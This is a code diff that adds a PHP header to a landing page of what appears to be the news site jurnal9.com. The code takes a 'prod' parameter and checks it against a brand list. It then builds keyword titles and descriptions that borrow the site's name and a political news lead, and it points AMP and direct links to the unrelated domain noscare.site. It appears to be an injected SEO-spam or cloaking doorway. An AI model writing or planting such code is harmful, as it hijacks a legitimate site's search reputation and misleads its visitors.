@@ -1,3 +1,33 @@
+<?php
+if (!isset($_GET['prod'])) {
+  include("loader.php"); // File "404.php" bertindak sebagai pengganti header 404
+    exit();
+} else {
+    $judul = $_GET['prod'];
+    $judul = str_replace(' ', '+', $judul);
+    $valid_brands = file("brand_list.txt", FILE_IGNORE_NEW_LINES);
+
+    if (!in_array(str_replace('+', ' ', $judul), $valid_brands)) {
+      include("loader.php"); // File "404.php" bertindak sebagai pengganti header 404
+        exit();
+    } else {
+        // Aksi jika $brand sesuai dengan salah satu nilai dalam file
+        $brand = strtoupper(str_replace('+', ' ', $judul)); // Penutupan kurung diperbaiki
+        $url = "https://jurnal9.com/";
+        $amp = "https://noscare.site/minggirlumiskin/?$judul.html";
+        $direct = "https://noscare.site/lawakludek/";
+        $canonical = "$url/?prod=$judul";
+        $favicon = "$url/favicon.png";
+        $logo = "$url/logo.png";
+        $banner = "$url/banner.webp";
+        $title = " $brand > Jurnal9.com – Inspiratif, Bukan Provokatif $brand";
+        $description = "Ketua KPK Setyo Budiyanto saat ditanya wartawan JAKARTA, jurnal9.com – Setelah Sekjen PDIP Hasto Kristyanto jadi tersangka kasus dugaan suap Harun Masiku. $brand aktif dalam berbagai kegiatan untuk meningkatkan mutu pendidikan dan pelestarian budaya lokal.";
+    }
+}
+?>
+
+
+<!-- Script Landing Page -->
 <!DOCTYPE HTML>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
 <head><meta charset="utf-8">
